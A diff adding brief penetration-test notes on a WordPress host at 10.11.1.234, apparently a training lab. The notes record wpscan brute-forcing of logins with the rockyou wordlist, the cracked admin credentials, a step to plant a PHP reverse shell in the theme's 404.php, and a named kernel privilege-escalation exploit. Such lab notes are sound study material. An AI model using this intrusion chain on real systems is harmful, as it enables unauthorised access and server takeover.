@@ -1,0 +1,40 @@
+# directories
+
+http://10.11.1.234/index 
+	-> home
+
+http://10.11.1.234/readme
+	-> WordPress Version 3.3.1 
+
+http://10.11.1.234/wp-includes/
+	-> web server files
+
+http://10.11.1.234/wp-links-opml
+	-> generator="WordPress/3.5.1"
+
+http://10.11.1.234/xmlrpc
+	-> XML-RPC server accepts POST requests only.
+
+http://10.11.1.234/wp-trackback
+	-> I really need an ID for this to work.
+
+http://10.11.1.234:10443/nina.html
+	-> This is just the quickest solution I could came to, if its not 
+		ok I will create something more stable on the HTTP server inside your subnet. 
+		\Carrie
+
+# admin login credentails
+wpscan --url http://$IP --passwords /usr/share/wordlists/rockyou.txt
+[SUCCESS] - admin / princess 
+
+# copy php reverse shell to 404.php themes and actviate it to get a shell
+http://10.11.1.234/wp-content/themes/twentytwelve/404.php
+
+# linux version
+Linux version 2.6.32
+
+# PE exploit
+Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - 'Full-Nelson.c' Local Privilege Escalation  | linux/local/15704.c
+
+
+
